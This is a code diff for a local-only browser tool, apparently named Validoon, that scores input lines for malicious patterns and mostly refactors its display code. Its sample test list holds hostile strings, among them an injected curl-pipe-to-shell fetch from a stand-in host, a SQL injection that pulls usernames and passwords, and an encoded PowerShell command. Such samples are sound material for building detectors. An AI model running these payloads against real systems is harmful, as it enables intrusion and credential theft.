@@ -2,14 +2,14 @@
 (() => {
   "use strict";
 
-  const BUILD = "v2026-01-03_final_mvp";
+  const BUILD = "v2026-01-03_final_mvp_freeze_unified_B";
   const nowISO = () => new Date().toISOString();
 
   function $(id) { return document.getElementById(id); }
 
-  function safeOn(el, evt, fn) {
+  function on(el, evt, fn) {
     if (!el) return;
-    el.addEventListener(evt, fn, { passive: true });
+    el.addEventListener(evt, fn);
   }
 
   function shannonEntropy(str) {
@@ -40,7 +40,7 @@
     return "Data";
   }
 
-  // Signal rules (severity/conf roughly aligned with your export JSON)
+  // Signal rules
   const RULES = [
     {
       label: "REDIRECT_PARAM",
@@ -107,7 +107,6 @@
       if (r.test(s)) hits.push({ label: r.label, sev: r.sev, conf: r.conf });
     }
 
-    // Decision logic
     let severity = 0, confidence = 0;
     if (hits.length) {
       severity = Math.max(...hits.map(h => h.sev));
@@ -118,7 +117,6 @@
     if (hits.some(h => h.sev >= 85) || hits.some(h => h.label === "DOWNLOAD_TOOL")) decision = "BLOCK";
     else if (hits.some(h => h.sev >= 55)) decision = "WARN";
 
-    // Keep the “local-only” property: do not do network checks.
     const type = classifyType(s);
     const entropy = shannonEntropy(s);
 
@@ -140,14 +138,13 @@
     if (counts.block > 0) verdict = "DANGER";
     else if (counts.warn > 0) verdict = "SUSPICIOUS";
 
-    // signals summary
     const sigMap = new Map();
     for (const r of rows) {
       for (const h of r.hits) sigMap.set(h.label, (sigMap.get(h.label) || 0) + 1);
     }
     const signals = [...sigMap.entries()]
-      .sort((a,b) => b[1]-a[1])
-      .map(([label,count]) => ({ label, count }));
+      .sort((a, b) => b[1] - a[1])
+      .map(([label, count]) => ({ label, count }));
 
     return { verdict, peakSeverity, confidence, counts, signals };
   }
@@ -165,31 +162,34 @@
     };
   }
 
+  function setVerdictClass(verdict) {
+    const box = $("verdictBox");
+    if (!box) return;
+    box.classList.remove("verdict-secure", "verdict-suspicious", "verdict-danger");
+    if (verdict === "DANGER") box.classList.add("verdict-danger");
+    else if (verdict === "SUSPICIOUS") box.classList.add("verdict-suspicious");
+    else box.classList.add("verdict-secure");
+  }
+
   function setVerdictUI(meta) {
     const verdictText = $("verdictText");
-    const box = $("verdictBox");
-    if (!verdictText || !box) return;
+    if (verdictText) verdictText.textContent = meta.verdict;
+    setVerdictClass(meta.verdict);
 
-    verdictText.textContent = meta.verdict;
+    const sevEl = $("peakSev");
+    const confEl = $("peakConf");
+    if (sevEl) sevEl.textContent = `${meta.peakSeverity}%`;
+    if (confEl) confEl.textContent = `${meta.confidence}%`;
 
-    // subtle background hint
-    box.style.borderColor =
-      meta.verdict === "DANGER" ? "rgba(239,68,68,.35)" :
-      meta.verdict === "SUSPICIOUS" ? "rgba(245,158,11,.35)" :
-      "rgba(45,212,191,.25)";
-
-    $("peakSev").textContent = `Peak severity: ${meta.peakSeverity}%`;
-    $("peakConf").textContent = `Confidence: ${meta.confidence}%`;
-
-    $("kScans").textContent = String(meta.counts.scans);
-    $("kAllow").textContent = String(meta.counts.allow);
-    $("kWarn").textContent = String(meta.counts.warn);
-    $("kBlock").textContent = String(meta.counts.block);
+    if ($("kScans")) $("kScans").textContent = String(meta.counts.scans);
+    if ($("kAllow")) $("kAllow").textContent = String(meta.counts.allow);
+    if ($("kWarn")) $("kWarn").textContent = String(meta.counts.warn);
+    if ($("kBlock")) $("kBlock").textContent = String(meta.counts.block);
 
     const reco = $("reco");
     if (reco) {
       if (meta.verdict === "DANGER") {
-        reco.textContent = "Remediation: Block these inputs in the pipeline. Do NOT open. Verify domain ownership. Escalate with JSON report.";
+        reco.textContent = "Remediation: Block these inputs. Do NOT open. Verify domain ownership. Escalate with JSON report.";
       } else if (meta.verdict === "SUSPICIOUS") {
         reco.textContent = "Remediation: Review suspicious entries. Verify domains. Sanitize/encode. Escalate if needed.";
       } else {
@@ -200,58 +200,68 @@
     const sigWrap = $("signals");
     if (sigWrap) {
       sigWrap.innerHTML = "";
-      for (const s of meta.signals) {
-        const d = document.createElement("div");
-        d.className = "sig";
-        d.textContent = `${s.label} ×${s.count}`;
-        sigWrap.appendChild(d);
-      }
       if (!meta.signals.length) {
         const d = document.createElement("div");
-        d.className = "sig";
+        d.className = "chip";
         d.textContent = "No active signals";
         sigWrap.appendChild(d);
+      } else {
+        for (const s of meta.signals) {
+          const d = document.createElement("div");
+          d.className = "chip";
+          if (meta.verdict === "DANGER") d.classList.add("bad");
+          else if (meta.verdict === "SUSPICIOUS") d.classList.add("warn");
+          else d.classList.add("ok");
+          d.textContent = `${s.label} ×${s.count}`;
+          sigWrap.appendChild(d);
+        }
       }
     }
   }
 
   function renderRows(rows) {
-    const host = $("rows");
-    if (!host) return;
-    host.innerHTML = "";
+    const body = $("rowsBody");
+    if (!body) return;
+    body.innerHTML = "";
+
+    if (!rows.length) {
+      const tr = document.createElement("tr");
+      tr.className = "empty";
+      const td = document.createElement("td");
+      td.colSpan = 6;
+      td.textContent = "No results yet.";
+      tr.appendChild(td);
+      body.appendChild(tr);
+      return;
+    }
 
     for (const r of rows) {
-      const tr = document.createElement("div");
-      tr.className = "trow";
+      const tr = document.createElement("tr");
 
-      const dotClass = r.decision === "ALLOW" ? "ok" : (r.decision === "WARN" ? "warn" : "bad");
+      const td1 = document.createElement("td");
+      td1.className = "mono";
+      td1.textContent = r.input.length > 180 ? r.input.slice(0, 180) + "…" : r.input;
 
-      const c1 = document.createElement("div");
-      c1.className = "mono";
-      c1.textContent = r.input.length > 120 ? r.input.slice(0, 120) + "…" : r.input;
+      const td2 = document.createElement("td");
+      td2.textContent = r.type;
 
-      const c2 = document.createElement("div");
-      c2.textContent = r.type;
+      const td3 = document.createElement("td");
+      const badge = document.createElement("span");
+      badge.className = "badge " + (r.decision === "ALLOW" ? "ok" : (r.decision === "WARN" ? "warn" : "bad"));
+      badge.textContent = r.decision;
+      td3.appendChild(badge);
 
-      const c3 = document.createElement("div");
-      c3.className = "tag";
-      const dot = document.createElement("span");
-      dot.className = `dot ${dotClass}`;
-      const t = document.createElement("span");
-      t.textContent = r.decision;
-      c3.append(dot, t);
+      const td4 = document.createElement("td");
+      td4.textContent = `${r.severity}%`;
 
-      const c4 = document.createElement("div");
-      c4.textContent = `${r.severity}%`;
+      const td5 = document.createElement("td");
+      td5.textContent = `${r.confidence}%`;
 
-      const c5 = document.createElement("div");
-      c5.textContent = `${r.confidence}%`;
+      const td6 = document.createElement("td");
+      td6.textContent = String(r.entropy);
 
-      const c6 = document.createElement("div");
-      c6.textContent = String(r.entropy);
-
-      tr.append(c1,c2,c3,c4,c5,c6);
-      host.appendChild(tr);
+      tr.append(td1, td2, td3, td4, td5, td6);
+      body.appendChild(tr);
     }
   }
 
@@ -316,7 +326,7 @@
     "C:\\Windows\\System32\\drivers\\etc\\hosts",
     "&& curl http://evl1.tld/payload.sh | sh",
     "UNION SELECT username,password FROM users",
-    "powershell -enc SQBFAFgA",
+    "powershell -enc SQBFAFgA"
   ];
 
   let lastReport = null;
@@ -328,7 +338,6 @@
     const lines = parseInputLines(inputEl.value);
     const rows = lines.map(analyzeOne);
     const report = buildReport(rows);
-
     lastReport = report;
 
     setVerdictUI({
@@ -384,19 +393,22 @@
 
   function openInfo() {
     const dlg = $("infoDlg");
-    if (dlg && typeof dlg.showModal === "function") dlg.showModal();
+    if (!dlg) return;
+    dlg.classList.remove("hidden");
+    dlg.setAttribute("aria-hidden", "false");
   }
 
   function closeInfo() {
     const dlg = $("infoDlg");
-    if (dlg && typeof dlg.close === "function") dlg.close();
+    if (!dlg) return;
+    dlg.classList.add("hidden");
+    dlg.setAttribute("aria-hidden", "true");
   }
 
   function boot() {
     const stamp = $("buildStamp");
     if (stamp) stamp.textContent = `Build: ${BUILD}`;
 
-    // Initialize UI to SECURE
     setVerdictUI({
       verdict: "SECURE",
       peakSeverity: 0,
@@ -404,14 +416,23 @@
       counts: { scans: 0, allow: 0, warn: 0, block: 0 },
       signals: []
     });
+    renderRows([]);
 
-    safeOn($("btnLoadA"), "click", () => loadTest(TEST_A));
-    safeOn($("btnLoadB"), "click", () => loadTest(TEST_B));
-    safeOn($("btnScan"), "click", runScanFromTextarea);
-    safeOn($("btnExport"), "click", exportJSON);
-    safeOn($("btnClear"), "click", clearAll);
-    safeOn($("btnInfo"), "click", openInfo);
-    safeOn($("btnCloseInfo"), "click", closeInfo);
+    on($("btnLoadA"), "click", () => loadTest(TEST_A));
+    on($("btnLoadB"), "click", () => loadTest(TEST_B));
+    on($("btnScan"), "click", runScanFromTextarea);
+    on($("btnExport"), "click", exportJSON);
+    on($("btnClear"), "click", clearAll);
+    on($("btnInfo"), "click", openInfo);
+    on($("btnCloseInfo"), "click", closeInfo);
+
+    // Close modal on backdrop click
+    const dlg = $("infoDlg");
+    if (dlg) {
+      on(dlg, "click", (e) => {
+        if (e.target === dlg) closeInfo();
+      });
+    }
 
     console.log(`[Validoon] ${BUILD} loaded. Local-only. No network.`);
   }
